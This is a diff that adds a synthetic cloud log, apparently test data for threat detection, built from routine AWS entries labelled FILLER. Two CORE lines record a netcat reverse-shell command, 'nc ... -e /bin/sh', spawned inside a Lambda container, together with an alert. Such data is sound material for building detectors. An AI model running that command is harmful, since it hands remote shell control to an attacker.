@@ -1,0 +1,37 @@
+[FILLER] CloudWatch [13/Sep/2026:21:00:00 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] VPC-Flow [13/Sep/2026:21:00:03 +0000]: ACCEPT OK AWS_LAMBDA_EXECUTION_ROLE 198.51.100.5 443 tcp 20 4000
+[FILLER] VPC-Flow [13/Sep/2026:21:00:05 +0000]: ACCEPT OK AWS_LAMBDA_EXECUTION_ROLE 198.51.100.5 443 tcp 20 4000
+[FILLER] CloudTrail [13/Sep/2026:21:00:09 +0000]: AssumeRole API called by arn:aws:iam::123456:role/app-tier
+[FILLER] ALB-Log [13/Sep/2026:21:00:13 +0000]: AWS_LAMBDA_EXECUTION_ROLE TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 200
+[FILLER] CloudTrail [13/Sep/2026:21:00:16 +0000]: AssumeRole API called by arn:aws:iam::123456:role/app-tier
+[FILLER] VPC-Flow [13/Sep/2026:21:00:18 +0000]: ACCEPT OK AWS_LAMBDA_EXECUTION_ROLE 198.51.100.5 443 tcp 20 4000
+[FILLER] CloudWatch [13/Sep/2026:21:00:20 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] CloudTrail [13/Sep/2026:21:00:23 +0000]: AssumeRole API called by arn:aws:iam::123456:role/app-tier
+[FILLER] CloudTrail [13/Sep/2026:21:00:24 +0000]: AssumeRole API called by arn:aws:iam::123456:role/app-tier
+[FILLER] VPC-Flow [13/Sep/2026:21:00:26 +0000]: ACCEPT OK AWS_LAMBDA_EXECUTION_ROLE 198.51.100.5 443 tcp 20 4000
+[FILLER] ALB-Log [13/Sep/2026:21:00:29 +0000]: AWS_LAMBDA_EXECUTION_ROLE TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 200
+[FILLER] CloudTrail [13/Sep/2026:21:00:30 +0000]: AssumeRole API called by arn:aws:iam::123456:role/app-tier
+[FILLER] ALB-Log [13/Sep/2026:21:00:32 +0000]: AWS_LAMBDA_EXECUTION_ROLE TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 200
+[FILLER] CloudTrail [13/Sep/2026:21:00:33 +0000]: AssumeRole API called by arn:aws:iam::123456:role/app-tier
+[FILLER] CloudWatch [13/Sep/2026:21:00:37 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] CloudWatch [13/Sep/2026:21:00:41 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] CloudTrail [13/Sep/2026:21:00:42 +0000]: AssumeRole API called by arn:aws:iam::123456:role/app-tier
+[FILLER] VPC-Flow [13/Sep/2026:21:00:46 +0000]: ACCEPT OK AWS_LAMBDA_EXECUTION_ROLE 198.51.100.5 443 tcp 20 4000
+[FILLER] CloudWatch [13/Sep/2026:21:00:48 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] ALB-Log [13/Sep/2026:21:00:49 +0000]: AWS_LAMBDA_EXECUTION_ROLE TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 200
+[FILLER] ALB-Log [13/Sep/2026:21:00:51 +0000]: AWS_LAMBDA_EXECUTION_ROLE TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 200
+[CORE] Process spawned inside Lambda container: /bin/sh -c "nc 198.51.100.5 4444 -e /bin/sh"
+[CORE] [CLOUD-ALERT] Reverse shell established from serverless compute environment.
+[FILLER] CloudWatch [13/Sep/2026:21:00:56 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] CloudTrail [13/Sep/2026:21:00:59 +0000]: AssumeRole API called by arn:aws:iam::123456:role/app-tier
+[FILLER] CloudWatch [13/Sep/2026:21:01:03 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] VPC-Flow [13/Sep/2026:21:01:06 +0000]: ACCEPT OK AWS_LAMBDA_EXECUTION_ROLE 198.51.100.5 443 tcp 20 4000
+[FILLER] CloudWatch [13/Sep/2026:21:01:10 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] ALB-Log [13/Sep/2026:21:01:14 +0000]: AWS_LAMBDA_EXECUTION_ROLE TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 200
+[FILLER] CloudWatch [13/Sep/2026:21:01:15 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] ALB-Log [13/Sep/2026:21:01:19 +0000]: AWS_LAMBDA_EXECUTION_ROLE TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 200
+[FILLER] VPC-Flow [13/Sep/2026:21:01:23 +0000]: ACCEPT OK AWS_LAMBDA_EXECUTION_ROLE 198.51.100.5 443 tcp 20 4000
+[FILLER] CloudWatch [13/Sep/2026:21:01:25 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] CloudWatch [13/Sep/2026:21:01:29 +0000]: EC2 CPU Utilization normal at 45% for 198.51.100.5
+[FILLER] ALB-Log [13/Sep/2026:21:01:30 +0000]: AWS_LAMBDA_EXECUTION_ROLE TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 200
+[FILLER] CloudTrail [13/Sep/2026:21:01:33 +0000]: AssumeRole API called by arn:aws:iam::123456:role/app-tier
